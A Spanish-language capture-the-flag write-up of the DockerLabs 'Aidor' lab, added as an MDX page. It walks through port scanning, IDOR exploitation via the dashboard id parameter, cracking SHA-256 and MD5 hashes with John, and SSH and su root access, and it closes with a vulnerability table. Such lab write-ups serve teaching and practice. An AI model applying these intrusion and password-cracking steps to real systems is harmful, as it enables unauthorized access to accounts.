@@ -1,0 +1,255 @@
+---
+title: Aidor
+description: Resolución completa de la máquina virtual *Aidor* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Aidor**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone una aplicación web en el puerto 5000 que permite registro de usuarios. Se identifica una vulnerabilidad **IDOR (Insecure Direct Object Reference)** en el parámetro `id` del dashboard, que permite acceder a información de otros usuarios, incluyendo hashes de contraseñas. 
+Tras crackear el hash del usuario `Aidor`, se obtiene acceso al sistema vía SSH. Una vez dentro, se encuentra el código fuente de la aplicación que contiene credenciales hardcodeadas del usuario `root` en forma de hash MD5. Al crackear este hash, se obtiene acceso directo como `root` sin necesidad de técnicas de escalada adicionales.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Aidor',
+    Autor: 'El Pingüino de Mario',
+    Dificultad: 'Fácil',
+    Fecha: '17/11/2025',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Aidor.zip
+sudo bash auto_deploy.sh Aidor.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Aidor/{content,exploits,nmap,scripts}
+cd Aidor
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **5000/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1767746884/Ports_s156od.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,5000 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se accede al puerto 5000 y se encuentra una aplicación de login:
+
+![Página de login](https://res.cloudinary.com/dewqswzke/image/upload/v1767746884/Index_ds758e.png)
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints:
+
+```bash
+feroxbuster -u http://172.17.0.2:5000 \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x php,html,js,txt \
+  -t 100 \
+  -C 404
+```
+
+![Resultado del escaneo](https://res.cloudinary.com/dewqswzke/image/upload/v1767746896/Feroxbuster_mgxxgv.png)
+
+**Recursos descubiertos:**
+- `/` - Página principal (login)
+- `/register` - Formulario de registro
+- `/dashboard` - Panel de usuario (requiere autenticación)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Registro de usuario
+
+Se crea una cuenta de prueba:
+- Usuario: `test`
+- Contraseña: `test`
+- Email: `test@test.com`
+
+### 2.2 Descubrimiento de IDOR
+
+Tras el login, se accede al dashboard en `/dashboard?id=55`:
+
+![Dashboard del usuario](https://res.cloudinary.com/dewqswzke/image/upload/v1767746884/ID_u1hwpa.png)
+
+### 2.3 Explotación del IDOR
+
+Se prueba con el ID 54 y se obtienen datos de otro usuario:
+
+```bash
+curl -s "http://172.17.0.2:5000/dashboard?id=54"
+```
+
+![Datos de Aidor](https://res.cloudinary.com/dewqswzke/image/upload/v1767746886/Hash_kslq5b.png)
+
+**Información obtenida:**
+- Usuario: `Aidor`
+- Hash: `7499aced43869b27f505701e4edc737f0cc346add1240d4ba86fbfa251e0fc35`
+
+### 2.4 Crackeo del hash
+
+El hash tiene formato SHA-256 (64 caracteres). Se procede a crackearlo:
+
+```bash
+echo "7499aced43869b27f505701e4edc737f0cc346add1240d4ba86fbfa251e0fc35" > hash.txt
+john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+![Resultado de John](https://res.cloudinary.com/dewqswzke/image/upload/v1767746884/John_fzb9di.png)
+
+**Contraseña obtenida:** `123456`
+
+### 2.5 Acceso SSH
+
+Se verifican las credenciales para SSH:
+
+```bash
+hydra -l aidor -p "123456" ssh://172.17.0.2
+```
+
+Se accede al sistema:
+
+```bash
+ssh aidor@172.17.0.2
+```
+
+![Conexión SSH exitosa](https://res.cloudinary.com/dewqswzke/image/upload/v1767746885/SSH_ufnxhr.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De aidor → root
+
+Se listan los archivos en el directorio home del usuario:
+
+```bash
+ls -la /home/aidor/
+```
+
+Se encuentran archivos críticos:
+- `database.db` — Base de datos
+- `app.py` — Código fuente de la aplicación
+
+### 3.2 Análisis del código fuente
+
+Se examina `app.py` y se encuentran credenciales hardcodeadas:
+
+```bash
+cat /home/aidor/app.py
+```
+
+![Hash root en código](https://res.cloudinary.com/dewqswzke/image/upload/v1767746884/RootComment_xxxwge.png)
+
+**Hash descubierto:** `25d55ad283aa400af464c76d713c07ad` (32 caracteres → MD5)
+
+### 3.3 Crackeo del hash de root
+
+Se procede a crackear el hash MD5:
+
+```bash
+echo "25d55ad283aa400af464c76d713c07ad" > root_hash.txt
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt root_hash.txt
+```
+
+![Crackeo de hash MD5](https://res.cloudinary.com/dewqswzke/image/upload/v1767746884/JohnRoot_dkhdzx.png)
+
+**Contraseña de root obtenida:** `12345678`
+
+### 3.4 Acceso como root
+
+Se utilizan las credenciales para escalar privilegios:
+
+```bash
+su root
+```
+
+![Shell como root](https://res.cloudinary.com/dewqswzke/image/upload/v1767746884/Root_cyd4cy.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "IDOR en parámetro `id`",
+      severity: "Alta",
+      impact: "Acceso no autorizado a información de otros usuarios"
+    },
+    {
+      vulnerability: "Almacenamiento de hashes SHA-256 sin sal",
+      severity: "Alta",
+      impact: "Facilita el crackeo masivo de contraseñas"
+    },
+    {
+      vulnerability: "Credenciales hardcodeadas en el código fuente",
+      severity: "Crítica",
+      impact: "Compromiso de cuentas privilegiadas"
+    },
+    {
+      vulnerability: "Uso de contraseñas débiles",
+      severity: "Media",
+      impact: "Facilita ataques de fuerza bruta y diccionario"
+    },
+    {
+      vulnerability: "Falta de control de acceso en el dashboard",
+      severity: "Alta",
+      impact: "Exposición de información sensible y escalamiento de privilegios"
+    }
+  ]}
+/>
